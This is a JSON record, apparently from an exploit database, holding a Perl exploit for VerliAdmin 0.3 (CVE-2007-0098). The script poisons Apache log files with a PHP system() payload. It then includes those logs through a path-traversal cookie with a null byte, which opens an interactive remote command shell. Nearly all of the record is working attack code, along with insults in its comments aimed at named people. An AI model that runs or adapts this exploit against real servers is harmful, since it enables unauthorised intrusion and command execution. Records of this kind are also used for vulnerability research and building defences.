{
  "id": "3075",
  "title": "VerliAdmin 0.3 - &#039;language.php&#039; Local File Inclusion",
  "cve": "CVE-2007-0098",
  "vuln_type": "path_traversal",
  "code": "#!/usr/bin/perl\r\n#\r\n# VerliAdmin <= 0.3 Remote Command Execution Exploit\r\n# linK : http://bohyn.czechweb.cz/\r\n# d0rk: allinurl:\"verliadmin\"\r\n#\r\n# (c)od3d and f0unded by Kw3[R]Ln from Romanian Security Team a.K.A http://RST-CREW.NET\r\n# Contact: ciriboflacs[AT]YaHOo.com or SkaskLL@msn.com\r\n#\r\n# Vurnerable Code in language.php: IF($_COOKIE['lang'] != \"en\")\r\n#\t                               {Include \"language/\".$_COOKIE['lang'].\".php\";}\r\n#\r\n# PS: fuck CacaBot, psyke and Sad_dreamer.. [top lamerZ]\r\n# t0 psyke[pwn]: \"y0ur c0de suqz. y0ur s1t3 suqz. y0u sm3ll 0f sh33p f3c3z. 3y3 th1nk y0u n33d t0 \r\n#                t4k3 4n 0nl1n3 w3b d3s1gn c0urz3 0r s0m3th1ng. fuqn d0rk.\"\r\n\r\n\r\nuse IO::Socket;\r\nuse LWP::Simple;\r\n\r\n\r\n@apache=(\r\n\"../../../../../var/log/httpd/access_log\",\r\n\"../../../../../var/log/httpd/error_log\",\r\n\"../apache/logs/error.log\",\r\n\"../apache/logs/access.log\",\r\n\"../../apache/logs/error.log\",\r\n\"../../apache/logs/access.log\",\r\n\"../../../apache/logs/error.log\",\r\n\"../../../apache/logs/access.log\",\r\n\"../../../../apache/logs/error.log\",\r\n\"../../../../apache/logs/access.log\",\r\n\"../../../../../apache/logs/error.log\",\r\n\"../../../../../apache/logs/access.log\",\r\n\"../logs/error.log\",\r\n\"../logs/access.log\",\r\n\"../../logs/error.log\",\r\n\"../../logs/access.log\",\r\n\"../../../logs/error.log\",\r\n\"../../../logs/access.log\",\r\n\"../../../../logs/error.log\",\r\n\"../../../../logs/access.log\",\r\n\"../../../../../logs/error.log\",\r\n\"../../../../../logs/access.log\",\r\n\"../../../../../etc/httpd/logs/access_log\",\r\n\"../../../../../etc/httpd/logs/access.log\",\r\n\"../../../../../etc/httpd/logs/error_log\",\r\n\"../../../../../etc/httpd/logs/error.log\",\r\n\"../../.. /../../var/www/logs/access_log\",\r\n\"../../../../../var/www/logs/access.log\",\r\n\"../../../../../usr/local/apache/logs/access_log\",\r\n\"../../../../../usr/local/apache/logs/access.log\",\r\n\"../../../../../var/log/apache/access_log\",\r\n\"../../../../../var/log/apache/access.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/www/logs/error_log\",\r\n\"../../../../../var/www/logs/error.log\",\r\n\"../../../../../usr/local/apache/logs/error_log\",\r\n\"../../../../../usr/local/apache/logs/error.log\",\r\n\"../../../../../var/log/apache/error_log\",\r\n\"../../../../../var/log/apache/error.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/log/error_log\"\r\n);\r\n\r\nprint \"[RST] VerliAdmin <= 0.3 Remote Command Execution Exploit\\n\";\r\nprint \"[RST] need magic_quotes_gpc = off\\n\";\r\nprint \"[RST] c0ded by Kw3rLN from Romanian Security Team [ http://rst-crew.net ] \\n\\n\";\r\n\r\n\r\nif (@ARGV < 3)\r\n{\r\n    print \"[RST] Usage: VerliAdmin.pl [host] [path] [apache_path]\\n\\n\";\r\n    print \"[RST] Apache Path: \\n\";\r\n    $i = 0;\r\n    while($apache[$i])\r\n    { print \"[$i] $apache[$i]\\n\";$i++;}\r\n    exit();\r\n}\r\n\r\n$host=$ARGV[0];\r\n$path=$ARGV[1];\r\n$apachepath=$ARGV[2];\r\n\r\nprint \"[RST] Injecting some code in log files...\\n\";\r\n$CODE=\"<?php ob_clean();system(\\$HTTP_COOKIE_VARS[cmd]);die;?>\";\r\n$socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$host\", PeerPort=>\"80\") or die \"[RST] Could not connect to host.\\n\\n\";\r\nprint $socket \"GET \".$path.$CODE.\" HTTP/1.1\\r\\n\";\r\nprint $socket \"User-Agent: \".$CODE.\"\\r\\n\";\r\nprint $socket \"Host: \".$host.\"\\r\\n\";\r\nprint $socket \"Connection: close\\r\\n\\r\\n\";\r\nclose($socket);\r\nprint \"[RST] Shell!! write q to exit !\\n\";\r\nprint \"[RST] IF not working try another apache path\\n\\n\";\r\n\r\nprint \"[shell] \";$cmd = <STDIN>;\r\n\r\nwhile($cmd !~ \"q\") {\r\n    $socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$host\", PeerPort=>\"80\") or die \"[RST] Could not connect to host.\\n\\n\";\r\n\r\n    print $socket \"GET \".$path.\"language.php HTTP/1.1\\r\\n\";\r\n    print $socket \"Host: \".$host.\"\\r\\n\";\r\n    print $socket \"Accept: */*\\r\\n\";\r\n    print $socket \"Cookie: lang=\".$apache[$apachepath].\"%00&cmd=$cmd\\r\\n\";\r\n    print $socket \"Connection: close\\r\\n\\n\";\r\n\r\n    while ($raspuns = <$socket>)\r\n    {\r\n        print $raspuns;\r\n    }\r\n\r\n    print \"[shell] \";\r\n    $cmd = <STDIN>;\r\n}\r\n\r\n# milw0rm.com [2007-01-03]",
  "url": "https://www.exploit-db.com/exploits/3075"
}